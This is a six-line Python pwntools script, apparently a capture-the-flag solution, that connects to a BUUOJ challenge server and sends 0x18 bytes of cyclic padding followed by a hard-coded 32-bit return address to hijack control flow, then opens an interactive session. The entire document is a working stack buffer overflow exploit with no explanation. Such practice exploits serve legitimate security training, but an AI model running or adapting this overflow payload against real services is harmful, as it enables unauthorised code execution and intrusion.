from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27499)
io.sendline(cyclic(0xC + 12) + p32(0x804856D))
io.interactive()
